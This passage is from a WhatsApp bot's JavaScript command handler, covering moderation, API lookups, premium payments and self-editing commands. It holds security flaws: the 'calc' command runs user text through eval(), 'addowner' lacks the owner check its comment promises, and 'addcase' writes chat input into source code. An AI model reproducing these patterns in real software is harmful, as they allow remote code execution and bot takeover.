        if (sessionPaidUsers.includes(user)) return mzazireply("⚠️ Already paid!");
        sessionPaidUsers.push(user);
        saveSessionPaid();
        mzazireply(`✅ @${user.split('@')[0]} added to paid users!`);
      }
      break;

//=====================================//

      case "delpaid": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentionedJid || mentionedJid.length === 0) return mzazireply(`Usage: ${prefix}delpaid @user`);
        const user = mentionedJid[0];
        const index = sessionPaidUsers.indexOf(user);
        if (index === -1) return mzazireply("❌ Not a paid user!");
        sessionPaidUsers.splice(index, 1);
        saveSessionPaid();
        mzazireply(`✅ @${user.split('@')[0]} removed from paid users!`);
      }
      break;

//=====================================//

      case "listpaid": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (sessionPaidUsers.length === 0) return mzazireply("📭 No paid users!");
        let t = `┏━━━━━━━━━━━━━━\n┃ 💎 PAID USERS\n┃\n`;
        sessionPaidUsers.forEach((u, i) => { t += `┃ ${i + 1}. @${u.split('@')[0]}\n`; });
        t += `┃\n┃ Total: ${sessionPaidUsers.length}\n┗━━━━━━━━━━━━━━`;
        await mzazi.sendMessage(sender, { text: t, mentions: sessionPaidUsers }, { quoted: m });
      }
      break;

//=====================================//

      case "addprem": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentionedJid || mentionedJid.length === 0) return mzazireply(`Usage: ${prefix}addprem @user`);
        const user = mentionedJid[0];
        const premiumUsers = loadJSON('./database/premium.json', []);
        if (premiumUsers.includes(user)) return mzazireply("⚠️ Already premium!");
        premiumUsers.push(user);
        saveJSON('./database/premium.json', premiumUsers);
        mzazireply(`✅ @${user.split('@')[0]} added to premium!`);
      }
      break;

//=====================================//

      case "delprem": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentionedJid || mentionedJid.length === 0) return mzazireply(`Usage: ${prefix}delprem @user`);
        const user = mentionedJid[0];
        const premiumUsers = loadJSON('./database/premium.json', []);
        const index = premiumUsers.indexOf(user);
        if (index === -1) return mzazireply("❌ Not premium!");
        premiumUsers.splice(index, 1);
        saveJSON('./database/premium.json', premiumUsers);
        mzazireply(`✅ @${user.split('@')[0]} removed from premium!`);
      }
      break;
      
//=====================================//

      case "setgcname":
//=====================================//

case "subject": {
try {
if (!isGroup) return mzazireply("❌ Group only");
if (!isAdmin && !isOwner) return mzazireply("❌ Admins only");
if (!text) return mzazireply(`Example: ${prefix}setgcname Mzazi Tech`);

await mzazi.groupUpdateSubject(sender, text);



} catch (e) {
logger.info(e);
mzazireply("❌ Failed to update group name");
}
}
break;


//=====================================//

case "close": {
try {
if (!isGroup) return mzazireply("❌ Group only");
if (!isAdmin && !isOwner) return mzazireply("❌ Admins only");


await mzazi.groupSettingUpdate(sender, 'announcement');



} catch (e) {
logger.info(e);
mzazireply("❌ Failed to close group");
}
}
break;


//=====================================//

case "open": {
try {
if (!isGroup) return mzazireply("❌ Group only");
if (!isAdmin && !isOwner) return mzazireply("❌ Admins only");


await mzazi.groupSettingUpdate(sender, 'not_announcement');



} catch (e) {
logger.info(e);
mzazireply("❌ Failed to open group");
}
}
break;


//=====================================//

case "getcase": {
try {

if (!isOwner) return mzazireply("❌ Only owner");

if (!text) {
return mzazireply(`Example: ${prefix}getcase menu`);
}

const filePath = "./case.js";

const data = fs.readFileSync(filePath, "utf8");

const regex = new RegExp(
`case ["']${text}["']([\\s\\S]*?)break`,
"i"
);

const match = data.match(regex);

if (!match) {
return mzazireply(`❌ Case *${text}* not found`);
}

mzazireply(`case "${text}"${match[1]}break`);

} catch (e) {
logger.info(e);
mzazireply("❌ Error getting case");
}
}
break;
//=====================================//

     
//=====================================//


//=====================================//

case "trt":
//=====================================//

case "translate": {
try {

if (!text) {
return mzazireply(`Example: ${prefix}trt hello`);
}

const translatte = require("translatte");

let res = await translatte(text, { to: "sw" });

mzazireply(`🌍 Translation:\n\n${res.text}`);

} catch (e) {
logger.info(e);
mzazireply("❌ Translation failed");
}
}
break;


//=====================================//

case "news": {
try {

const response = await fetch("https://gnews.io/api/v4/top-headlines?topic=world&token=API_KEY");

const data = await response.json();

if (!data.articles) {
return mzazireply("❌ Failed kupata news");
}

let txt = "📰 *Top World News*\n\n";

for (let i of data.articles.slice(0, 5)) {
txt += `📌 ${i.title}\n🔗 ${i.url}\n\n`;
}

mzazireply(txt);

} catch (e) {
logger.info(e);
mzazireply("❌ News imefail");
}
}
break;


//=====================================//

case "catfact": {
try {

const response = await fetch("https://catfact.ninja/fact");

const data = await response.json();

mzazireply(`🐱 Cat Fact:\n\n${data.fact}`);

} catch (e) {
logger.info(e);
mzazireply("❌ Cat imekataa kutoa fact");
}
}
break;


//=====================================//

case "advice": {
try {

const response = await fetch("https://api.adviceslip.com/advice");

const data = await response.json();

mzazireply(`💡 Advice:\n\n${data.slip.advice}`);

} catch (e) {
logger.info(e);
mzazireply("❌ No advice today 😅");
}
}
break;


//=====================================//

case "quote": {
try {

const response = await fetch("https://api.quotable.io/random");

const data = await response.json();

mzazireply(`📖 Quote\n\n"${data.content}"\n\n— ${data.author}`);

} catch (e) {
logger.info(e);
mzazireply("❌ Quote imefail");
}
}
break;


//=====================================//

case "joke": {
try {

const response = await fetch("https://official-joke-api.appspot.com/random_joke");

const data = await response.json();

mzazireply(`😂 Joke\n\n${data.setup}\n\n${data.punchline}`);

} catch (e) {
logger.info(e);
mzazireply("❌ Joke imekataa");
}
}
break;


//=====================================//

case "weather": {
try {

if (!text) {
return mzazireply(`Example: ${prefix}weather Mombasa`);
}

const response = await fetch(`https://wttr.in/${encodeURIComponent(text)}?format=j1`);

const data = await response.json();

const area = data.nearest_area[0].areaName[0].value;
const country = data.nearest_area[0].country[0].value;

const temp = data.current_condition[0].temp_C;
const desc = data.current_condition[0].weatherDesc[0].value;
const humidity = data.current_condition[0].humidity;
const wind = data.current_condition[0].windspeedKmph;

let txt = `
🌍 Location: ${area}, ${country}
🌡 Temperature: ${temp}°C
☁ Condition: ${desc}
💧 Humidity: ${humidity}%
🌬 Wind: ${wind} km/h
`;

mzazireply(txt);

} catch (e) {
logger.info(e);
mzazireply("❌ Failed kupata weather");
}
}
break;
//=====================================//

   case "calc":
//=====================================//

case "define":
//=====================================//

case "github":
//=====================================//

case "qr":
//=====================================//

case "gpass":
//=====================================//

case "hack":
//=====================================//

case "shorturl": {

try {

switch (command) {

//=====================================//

case "calc": {

if (!text) {
return mzazireply(`Example: ${prefix}calc 5+5*10`);
}

let result = eval(text);

return mzazireply(`🧮 Answer: ${result}`);
}


//=====================================//

case "define": {

if (!text) {
return mzazireply(`Example: ${prefix}define love`);
}

const response = await fetch(
`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`
);

const data = await response.json();

if (!Array.isArray(data)) {
return mzazireply("❌ Word not found");
}

let word = data[0].word;
let meaning = data[0].meanings[0].definitions[0].definition;

return mzazireply(`📖 Word: ${word}\n\nMeaning: ${meaning}`);
}


//=====================================//

case "github": {

if (!text) {
return mzazireply(`Example: ${prefix}github torvalds`);
}

const response = await fetch(
`https://api.github.com/users/${encodeURIComponent(text)}`
);

const data = await response.json();

if (data.message) {
return mzazireply("❌ User not found");
}

let txt = `
👤 Username: ${data.login}
📝 Bio: ${data.bio || "No bio"}
📦 Public Repos: ${data.public_repos}
👥 Followers: ${data.followers}
🔗 ${data.html_url}
`;

return mzazireply(txt);
}


//=====================================//

case "qr": {

if (!text) {
return mzazireply(`Example: ${prefix}qr hello`);
}

let url = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(text)}`;

await mzazi.sendMessage(sender, {
image: { url },
caption: "✅ QR Code Generated"
}, { quoted: m });

return;
}


//=====================================//

case "gpass": {

function pass(length) {

let chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
let result = "";

for (let i = 0; i < length; i++) {
result += chars.charAt(Math.floor(Math.random() * chars.length));
}

return result;
}

return mzazireply(`🔐 Generated Password:\n\n${pass(12)}`);
}


//=====================================//

case "hack": {

if (!text) {
return mzazireply(`Example: ${prefix}hack Mzazi`);
}

let stages = [
"🔍 Connecting to target...",
"📱 Hacking WhatsApp...",
"🛡 Bypassing security...",
"💾 Accessing database...",
"☣ Injecting virus...",
"✅ Success 😈"
];

const sent = await mzazi.sendMessage(sender, {
text: `👨‍💻 Hacking ${text} started...`
}, { quoted: m });

for (let i of stages) {

await new Promise(r => setTimeout(r, 1500));

await mzazi.sendMessage(sender, {
text: i,
edit: sent.key
});
}

return;
}


//=====================================//

case "shorturl": {

if (!text) {
return mzazireply(`Example: ${prefix}shorturl https://google.com`);
}

const response = await fetch(
`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`
);

const data = await response.text();

return mzazireply(`🔗 Shortened URL:\n\n${data}`);
}

}

} catch (e) {

logger.info(e);

mzazireply("❌ Command failed");

}
}
break;


//=====================================//

case "pair": {

if (isPaid) {
return mzazireply("✅ You already have premium access.");
}

const buttons = [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "💳 Proceed To Payment",
id: ".proceed"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "❌ Cancel",
id: ".cancel"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "✅ Already Paid",
id: ".paid"
})
}

]

await mzazi.sendMessage(sender, {
text:
`╔════════════════╗
║ PREMIUM ACCESS
╚════════════════╝

To use PAIR feature you must buy premium access.

💰 Amount: 1$
📱 M-Pesa Number: 0741388986`,

footer: "Mzazi Tech Inc",

interactiveButtons: buttons

}, { quoted: m })

}
break;



//=====================================//

case "proceed": {

const buttons = [

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "🌐 Open Payment Website",
url: "https://payment.mzazi.shop"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "✅ Already Paid",
id: ".paid"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "❌ Cancel",
id: ".cancel"
})
}

]

await mzazi.sendMessage(sender, {
text:
`╔════════════════╗
║ PAYMENT OPTIONS
╚════════════════╝

💰 Amount: 1$

📱 M-Pesa Number:
0741388986

🌐 Website:
https://payment.mzazi.shop`,

footer: "Mzazi Tech Inc",

interactiveButtons: buttons

}, { quoted: m })

}
break;



//=====================================//

case "cancel": {

mzazireply("❌ Payment process cancelled.")

}
break;



//=====================================//

case "paid": {

await mzazi.sendMessage("254750611309@s.whatsapp.net", {

text:
`💸 PREMIUM PAYMENT REQUEST

👤 User: @${senderNum}
📱 Number: ${senderNum}

The user claims payment has been completed.`,

mentions: [msgSender]

})

mzazireply(
"✅ Payment request sent to admin.\nPlease wait for verification."
)

}
break;
      
//=====================================//

   case "addcase": {
try {

if (!isOwner) {
return mzazireply("❌ Owner only");
}

if (!text) {
return mzazireply(
`Example:\n${prefix}addcase case "test": {\nreply("Hello")\n}\nbreak;`
);
}

const fs = require("fs");

const filePath = "./case.js";

let data = fs.readFileSync(filePath, "utf8");

const position = data.lastIndexOf("default:");

if (position === -1) {
return mzazireply("❌ Failed to find switch end");
}

const updated =
data.slice(0, position) +
"\n\n" +
text +
"\n\n" +
data.slice(position);

fs.writeFileSync(filePath, updated);

mzazireply("✅ Case added successfully");

} catch (e) {

logger.info(e);

mzazireply("❌ Failed to add case");

}
}
break;
//=====================================//

     case "delcase": {
try {

if (!isOwner) {
return mzazireply("❌ Owner only");
}

if (!text) {
return mzazireply(`Example: ${prefix}delcase play`);
}

const fs = require("fs");

const filePath = "./case.js";

let data = fs.readFileSync(filePath, "utf8");

const regex = new RegExp(
`case ["']${text}["']:\\s*\\{[\\s\\S]*?break;`,
"g"
);

if (!regex.test(data)) {
return mzazireply(`❌ Case *${text}* not found`);
}

const updated = data.replace(regex, "");

fs.writeFileSync(filePath, updated);

mzazireply(`✅ Case *${text}* deleted successfully`);

} catch (e) {

logger.info(e);

mzazireply("❌ Failed to delete case");

}
}
break;
//=====================================//

case "listcase": {
try {

if (!isOwner) {
return mzazireply("❌ Owner only");
}

const fs = require("fs");

const data = fs.readFileSync("./case.js", "utf8");

const matches = [...data.matchAll(/case\s+["']([^"']+)["']/g)];

if (!matches.length) {
return mzazireply("❌ No cases found");
}

let txt = `📂 *LIST OF CASES*\n`;
txt += `╔══════════════╗\n`;

matches.forEach((m, i) => {
txt += `║ ${i + 1}. ${m[1]}\n`;
});

txt += `╚══════════════╝\n`;
txt += `\n📦 Total Cases: ${matches.length}`;

mzazireply(txt);

} catch (e) {

logger.info(e);

mzazireply("❌ Failed to get case list");

}
}
break;
//=====================================//

      case "addowner": {
  // Only current owners can add a new owner
  

  // Check if user mentioned someone
  const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
  if (!mentionedJid || mentionedJid.length === 0) {
    return mzazireply(`Usage: ${prefix}addowner @user\nExample: .addowner @254712345678`);
  }

  const target = mentionedJid[0];
  const targetNum = target.split('@')[0].split(':')[0];

  // Prevent adding yourself again
  if (targetNum === senderNum) return mzazireply("ℹ️ You are already an owner.");

  const owners = getOwners();
  if (owners.includes(targetNum)) {
    return mzazireply(`⚠️ @${targetNum} is already an owner.`);
  }

  addOwner(targetNum);
  mzazireply(`✅ @${targetNum} has been added as a bot owner.`);
}
break;


//=====================================//

      case 'play2': {
    if (!text) return mzazireply("🎧 Example: .play faded")

    let api = `https://mzazi-api.vercel.app/play?query=${encodeURIComponent(text)}&key=darknode-9x7kP2`

    let { data } = await axios.get(api)

    if (!data.status) return mzazireply("❌ Song not found")

    // 🔥 send info first
    await mzazi.sendMessage(m.chat, {
        image: { url: data.thumbnail },
        caption: `╭━━〔 🎧 ${botName.toUpperCase()} PLAYER 〕━━⬣
┃ 🎵 Title : ${data.title}
┃ 📺 Channel : ${data.channel}
┃ ⏱ Duration : ${data.duration}
┃ 👀 Views : ${data.views}
╰━━━━━━━━━━━━━━━━⬣

⏳ Downloading audio...`
    }, { quoted: m })

    // 🔥 send audio
    await mzazi.sendMessage(m.chat, {
        audio: { url: data.download },
        mimetype: 'audio/mpeg',
        fileName: `${data.title}.mp3`
    }, { quoted: m })
}
break
      
      

//=====================================//

case "public": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const s = loadJSON(settingsPath, { publicMode: true, selfMode: false });
        s.publicMode = !s.publicMode;
        if (s.publicMode) s.selfMode = false;
        saveJSON(settingsPath, s);
        mzazireply(
          s.publicMode
            ? `🌍 *Public Mode ON*\nEveryone can use the bot.`
            : `🔒 *Public Mode OFF*\nOnly owner can use the bot.`
        );
        break;
      }

//=====================================//

      case "self": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const s = loadJSON(settingsPath, { publicMode: true, selfMode: false });
        s.selfMode = !s.selfMode;
        s.publicMode = !s.selfMode;
        saveJSON(settingsPath, s);
        mzazireply(
          s.selfMode
            ? `👤 *Self Mode ON*\nOnly owner can use the bot.`
            : `🌍 *Self Mode OFF*\nPublic mode restored.`
        );
        break;
      }

//=====================================//

      case "setprefix": {
    if (!isOwner) return mzazireply("❌ Owner only!");

    const newPrefix = args[0];

    if (!newPrefix) {
        return mzazireply(
            `📌 *Current prefix:* \`${prefix || "none"}\`\n\n` +
            `Usage: ${prefix}setprefix <new prefix>\n` +
            `Example: ${prefix}setprefix !\n` +
            `To remove prefix: ${prefix}setprefix none`
        );
    }

    const settingsPath = `./database/sessions/${botPhoneNum}/settings.json`;
    const settings = loadJSON(settingsPath, {
        publicMode: true,
        selfMode: false
    });

    if (newPrefix.toLowerCase() === "none") {
        settings.customPrefix = "";
        saveJSON(settingsPath, settings);

        return mzazireply(
            "✅ Prefix disabled.\n" +
            "Commands can now be used without a prefix.\n\n" +
            "Example:\nmenu\nping\nalive"
        );
    }

    if (newPrefix.length > 3 || newPrefix.length < 1) {
        return mzazireply("❌ Prefix must be 1-3 characters long.");
    }

    settings.customPrefix = newPrefix;
    saveJSON(settingsPath, settings);

    mzazireply(
        `✅ Command prefix changed to: \`${newPrefix}\`\n` +
        `Example: ${newPrefix}menu`
    );
    break;
}

   
      



//=====================================//

case "ping2": {
try {

const start = Date.now();

await mzazi.sendPresenceUpdate("composing", sender);

const speed = Date.now() - start;

const used = process.memoryUsage();

const ram = `${(used.heapUsed / 1024 / 1024).toFixed(2)} MB`;
const total = `${(used.heapTotal / 1024 / 1024).toFixed(2)} MB`;

const txt = `
╔══════════════╗
║ PING STATUS
╚══════════════╝

⚡ Speed: ${speed} ms
🕒 Runtime: ${runtime(process.uptime())}
💾 RAM Used: ${ram}
📦 Total RAM: ${total}
🖥 Platform: ${os.platform()}
📱 Device: ${os.hostname()}
🚀 Status: Online
`;

mzazireply(txt);

} catch (e) {

logger.info(e);

mzazireply("❌ Failed to check ping");

}
}
break;



//=====================================//

case "kick": {
  if (!isGroup) return mzazireply("❌ This command works only in groups.");
  if (!isAdmin && !isOwner) return mzazireply("❌ Only admins or the owner can kick members.");

  // 1) Extract target JID
  let targetJid = null;

  // Check if replying to a message
  const quoted = m.message?.extendedTextMessage?.contextInfo?.participant;
  if (quoted) {
    targetJid = quoted;
  }

  // Check if mentioning someone
  const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  if (mentioned.length > 0) {
    targetJid = mentioned[0];
  }

  // If argument is a number, build JID
  if (!targetJid && args.length > 0) {
    const num = args[0].replace(/\D/g, "");
    if (num.length > 5) {
      targetJid = num + "@s.whatsapp.net";
    }
  }

  if (!targetJid) {
    return mzazireply("❌ Please mention, reply to, or provide the number of the member to kick.");
  }

  // Ensure we don't kick the bot itself
  if (normalizeJid(targetJid) === normalizeJid(mzazi.user?.id)) {
    return mzazireply("❌ I can't kick myself.");
  }

  // Check if target is an admin (prevent kicking admins)
  const targetNormal = normalizeJid(targetJid);
  if (groupAdmins.includes(targetNormal)) {
    return mzazireply("❌ I cannot kick an admin.");
  }

  try {
    await mzazi.groupParticipantsUpdate(sender, [targetJid], "remove");
    await mzazireply(`✅ @${targetNormal} has been kicked from the group.`, { mentions: [targetJid] });
  } catch (e) {
    logger.error(e);
    await mzazireply(`❌ Failed to kick: ${e.message || "unknown error"}`);
  }
  break;
}

//=====================================//

case "listgroup":
//=====================================//

case "grouplist": {
try {
const groups = await mzazi.groupFetchAllParticipating();

const data = Object.values(groups);

if (!data.length) {
return mzazireply("❌ No groups found");
}

let txt = `📂 *GROUP LIST*\n\n`;

for (let i = 0; i < data.length; i++) {

txt += `╔══════════════╗
║ ${i + 1}. ${data[i].subject}
║ 👥 Members: ${data[i].participants.length}
║ 🆔 ID: ${data[i].id}
╚══════════════╝\n\n`;

}

txt += `📦 Total Groups: ${data.length}`;

mzazireply(txt);

} catch (e) {

logger.info(e);

mzazireply("❌ Failed to fetch groups");

}
}
break;





//=====================================//

case "admins":
//=====================================//

case "tagadmins": {
try {

if (!isGroup) {
return mzazireply("❌ Group only");
}

if (!groupAdmins.length) {
return mzazireply("❌ No admins found");
}

let txt = `👑 *GROUP ADMINS*\n\n`;

for (let admin of groupAdmins) {
txt += `➤ @${admin.split("@")[0]}\n`;
}

await mzazi.sendMessage(sender, {
text: txt,
mentions: groupAdmins
}, { quoted: m });

} catch (e) {

logger.info(e);

mzazireply("❌ Failed to tag admins");

}
}
break;





//=====================================//

case "test": {
mzazireply("Hello")
}
break;



//=====================================//

case "mathgpt":
//=====================================//

case "mathai": {
try {

if (!text) {
return mzazireply(
`🧠 *MathGPT AI*\n\n` +
`Usage: ${prefix}mathgpt <math question>\n` +
`Example: ${prefix}mathgpt Solve 2x + 5 = 15`
);
}

mzazireply("🧠 Solving your math problem...");

const url =
`https://api.nexray.web.id/ai/mathgpt?text=${encodeURIComponent(text)}`;

const { data } = await axios.get(url);

if (!data.status) {
return mzazireply("❌ Failed to get a valid response");
}

let result =
data.result || "No response from AI.";

/*
 Prevent WhatsApp overflow
*/
if (result.length > 3000) {
result =
result.slice(0, 3000) +
"\n\n_...response truncated_";
}

const caption =
`🧠 *${botName.toUpperCase()} MATHGPT*\n` +
`${"─".repeat(25)}\n\n` +
result +
`\n\n${"─".repeat(25)}\n` +
`⚡ Response Time: ${data.response_time || "N/A"}\n` +
`🤖 Powered By ${botName.toUpperCase()}`;

return mzazireply(caption);

} catch (e) {

logger.info("MATHGPT ERROR:", e);

return mzazireply(
`❌ Error solving math problem\n${e.message}`
);

}
}
break;



//=====================================//

case "approve": {
try {

if (!isGroup) {
return mzazireply("❌ This command only works in groups");
}

if (!isAdmin && !isOwner) {
return mzazireply("❌ Admin only command");
}

const requests = await mzazi.groupRequestParticipantsList(sender);

if (!requests || requests.length === 0) {
return mzazireply("❌ No pending join requests");
}

for (const user of requests) {

await mzazi.groupRequestParticipantsUpdate(
sender,
[user.jid],
"approve"
);

}



} catch (err) {

logger.info("APPROVE ERROR:", err);

mzazireply("❌ Failed to approve pending members");

}
}
break;



//=====================================//

case "reject": {
try {

if (!isGroup) {
return mzazireply("❌ This command only works in groups");
}

if (!isAdmin && !isOwner) {
return mzazireply("❌ Admin only command");
}

const requests = await mzazi.groupRequestParticipantsList(sender);

if (!requests || requests.length === 0) {
return mzazireply("❌ No pending join requests");
}

for (const user of requests) {

await mzazi.groupRequestParticipantsUpdate(
sender,
[user.jid],
"reject"
);

}



} catch (err) {

logger.info("REJECT ERROR:", err);

mzazireply("❌ Failed to reject pending members");

}
}
break;


//=====================================//

case "lyrics2":
//=====================================//

case "lyric2":
//=====================================//

case "songlyrics": {
try {

if (!text) {
return mzazireply(
`🎵 *Lyrics Search*\n\n` +
`Usage: ${prefix}lyrics2 <song name>\n` +
`Example: ${prefix}lyrics2 faded`
);
}

mzazireply("🔍 Searching lyrics...");

const url = `https://apiskeith.top/search/lyrics2?query=${encodeURIComponent(text)}`;

const { data } = await axios.get(url);

if (!data.status || !data.result) {
return mzazireply("❌ Lyrics not found");
}

let lyricsText = data.result;

/*
 Prevent WhatsApp overflow
*/
if (lyricsText.length > 3000) {
lyricsText =
lyricsText.slice(0, 3000) +
"\n\n_...lyrics truncated_";
}

const caption =
`🎵 *${botName.toUpperCase()} LYRICS*\n\n` +
`🔎 Query: ${text}\n` +
`${"─".repeat(25)}\n\n` +
lyricsText +
`\n\n${"─".repeat(25)}\n` +
`⚡ Powered By ${botName.toUpperCase()}`;

return mzazireply(caption);

} catch (e) {

logger.info("LYRICS ERROR:", e);

return mzazireply(
`❌ Error fetching lyrics\n${e.message}`
);

}
}
break;



//=====================================//

case "chemistryai":
//=====================================//

case "chemai":
//=====================================//

case "scienceai": {
try {

if (!text) {
return mzazireply(
`🧪 *Science AI*\n\n` +
`Usage: ${prefix}chemistryai <question>\n` +
`Example: ${prefix}chemistryai What is Newton's law of motion?`
);
}

mzazireply("🧠 Thinking...");

const url =
`https://apiskeith.top/education/physics?q=${encodeURIComponent(text)}`;

const { data } = await axios.get(url);

if (!data.status || !data.result) {
return mzazireply("❌ No answer found");
}

let result = data.result;

/*
 Prevent WhatsApp overflow
*/
if (result.length > 3000) {
result =
result.slice(0, 3000) +
"\n\n_...response truncated_";
}

const caption =
`🧪 *${botName.toUpperCase()} SCIENCE AI*\n\n` +
`${"─".repeat(25)}\n\n` +
result +
`\n\n${"─".repeat(25)}\n` +
`⚡ Powered By ${botName.toUpperCase()}`;

return mzazireply(caption);

} catch (e) {

logger.info("SCIENCE AI ERROR:", e);

return mzazireply(
`❌ Error fetching answer\n${e.message}`
);

}
}
break;



//=====================================//

case "fruit":
//=====================================//

case "fruitinfo": {
try {

if (!text) {
return mzazireply(
`🍎 *Fruit Info*\n\n` +
`Usage: ${prefix}fruit <fruit name>\n` +
`Example: ${prefix}fruit lemon`
);
}

mzazireply("🍏 Fetching fruit data...");

const url =
`https://apiskeith.top/education/fruit?q=${encodeURIComponent(text)}`;

const { data } = await axios.get(url);

if (!data.status || !data.result) {
return mzazireply("❌ Fruit not found");
}

const f = data.result;

const caption =
`🍎 *${botName.toUpperCase()} FRUIT INFO*\n` +
`${"─".repeat(25)}\n\n` +
`📌 Name: ${f.name}\n` +
`🌿 Family: ${f.family}\n` +
`🧬 Genus: ${f.genus}\n` +
`📚 Order: ${f.order}\n\n` +

`🥗 Nutrition (per 100g)\n` +
`🔥 Calories: ${f.nutritions.calories}\n` +
`🧈 Fat: ${f.nutritions.fat}g\n` +
`🍬 Sugar: ${f.nutritions.sugar}g\n` +
`🍞 Carbs: ${f.nutritions.carbohydrates}g\n` +
`💪 Protein: ${f.nutritions.protein}g\n\n` +

`${"─".repeat(25)}\n` +
`⚡ Powered By ${botName.toUpperCase()}`;

return mzazireply(caption);

} catch (e) {

logger.info("FRUIT ERROR:", e);

return mzazireply(
`❌ Error fetching fruit info\n${e.message}`
);

}
}
break;



//=====================================//

case "bible": {
 if (!text) {
 return mzazireply(
`╔══════════════════════╗
║ 📖 ${botName.toUpperCase()} 📖
╚══════════════════════╝

✝️ Please provide a Bible verse.

╭─❍ Example
│ • .bible John 3:16
│ • .bible Psalm 23:1
│ • .bible Romans 8:28
╰───────────────❍

⚡ Powered By ${botName.toUpperCase()}`
 );
 }

 try {
 const response = await fetch(`https://bible-api.com/${encodeURIComponent(text)}`);
 const data = await response.json();

 if (!data.reference || !data.text) {
 return mzazireply(
`╔══════════════════════╗
║ 📖 ${botName.toUpperCase()} 📖
╚══════════════════════╝

❌ Bible verse not found.

╭─❍ Example
│ • .bible John 3:16
╰───────────────❍

⚡ Powered By ${botName.toUpperCase()}`
 );
 }

 const msg = `
╔══════════════════════╗
║ 📖 ${botName.toUpperCase()} 📖
╚══════════════════════╝

✝️ *Reference:* ${data.reference}

╭────────────────❍
${data.text.trim()}
╰────────────────❍

🙏 Stay blessed.

⚡ Powered By ${botName.toUpperCase()}
`;

 mzazireply(msg);

 } catch (err) {
 logger.error(err);

 mzazireply(
`╔══════════════════════╗
║ 📖 ${botName.toUpperCase()} 📖
╚══════════════════════╝

❌ Failed to fetch Bible verse.
Please try again later.

⚡ Powered By ${botName.toUpperCase()}`
 );
 }
}
break;



//=====================================//

case "tagall": {
try {

if (!isGroup) {
return mzazireply("❌ This command only works in groups");
}

if (!isAdmin && !isOwner) {
return mzazireply("❌ Admin only command");
}

const members = participants.map(v => v.id);

let teks =
`📢 *${botName.toUpperCase()} TAG ALL*\n\n`;

for (let mem of members) {

teks += `⬡ @${mem.split("@")[0]}\n`;

}

await mzazi.sendMessage(
m.chat,
{
text: teks,
mentions: members
},
{ quoted: m }
);

} catch (e) {

logger.info("TAGALL ERROR:", e);

mzazireply(
`❌ Failed to tag members\n${e.message}`
);

}
}
break;
// ─────────────────────────────────────────────
//  CLOSE TIME
// ─────────────────────────────────────────────
// ─────────────────────────────────────────────
//  CLOSE GROUP AFTER TIME
// ─────────────────────────────────────────────
//=====================================//

case "closetime": {
    if (!isGroup) return mzazireply("❌ This command only works in groups.");
    if (!isAdmin && !isOwner) return mzazireply("❌ Admin only command.");
    

    if (!text) {
        return mzazireply(
`❌ Example Usage:

${prefix}closetime 10s
${prefix}closetime 5m
${prefix}closetime 2h`
        );
    }

    let timer;

    if (text.endsWith("s")) {
        timer = parseInt(text) * 1000;
    } else if (text.endsWith("m")) {
        timer = parseInt(text) * 60 * 1000;
    } else if (text.endsWith("h")) {
        timer = parseInt(text) * 60 * 60 * 1000;
    } else {
        return mzazireply("❌ Use s, m, or h\nExample: 10s / 5m / 2h");
    }

    if (isNaN(timer)) return mzazireply("❌ Invalid number.");

    mzazireply(
`⏳ Group will close in ${text}

> ${botName.toUpperCase()}`
    );

    setTimeout(async () => {
        try {
            await mzazi.groupSettingUpdate(sender, "announcement");

            await mzazi.sendMessage(sender, {
                text:
`🔒 *GROUP CLOSED*

🕒 Closed After: ${text}
📌 Only admins can send messages now.

> ${botName.toUpperCase()}`
            });

        } catch (e) {
            logger.info(e);
        }
    }, timer);
}
break;


// ─────────────────────────────────────────────
//  OPEN GROUP AFTER TIME
// ─────────────────────────────────────────────
//=====================================//

case "opentime": {
    if (!isGroup) return mzazireply("❌ This command only works in groups.");
    if (!isAdmin && !isOwner) return mzazireply("❌ Admin only command.");
    

    if (!text) {
        return mzazireply(
`❌ Example Usage:

${prefix}opentime 10s
${prefix}opentime 5m
${prefix}opentime 2h`
        );
    }

    let timer;

    if (text.endsWith("s")) {
        timer = parseInt(text) * 1000;
    } else if (text.endsWith("m")) {
        timer = parseInt(text) * 60 * 1000;
    } else if (text.endsWith("h")) {
        timer = parseInt(text) * 60 * 60 * 1000;
    } else {
        return mzazireply("❌ Use s, m, or h\nExample: 10s / 5m / 2h");
    }

    if (isNaN(timer)) return mzazireply("❌ Invalid number.");

    mzazireply(
`⏳ Group will open in ${text}

> ${botName.toUpperCase()}`
    );

    setTimeout(async () => {
        try {
            await mzazi.groupSettingUpdate(sender, "not_announcement");

            await mzazi.sendMessage(sender, {
                text:
`🔓 *GROUP OPENED*

🕒 Opened After: ${text}
✅ Members can now send messages.

> ${botName.toUpperCase()}`
            });

        } catch (e) {
            logger.info(e);
        }
    }, timer);
}
break;
//=====================================//

//=====================================//

//=====================================//

//=====================================//

case 'prices':
//=====================================//

case 'pricelist': {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load image (optional)
        let imgField = {};
        const imageUrl = 'https://n.uguu.se/EtQsLZAZ.jpg';
        try {
            const imageMsg = await generateWAMessageContent(
                { image: { url: imageUrl } },
                { upload: mzazi.waUploadToServer }
            );
            if (imageMsg?.imageMessage) {
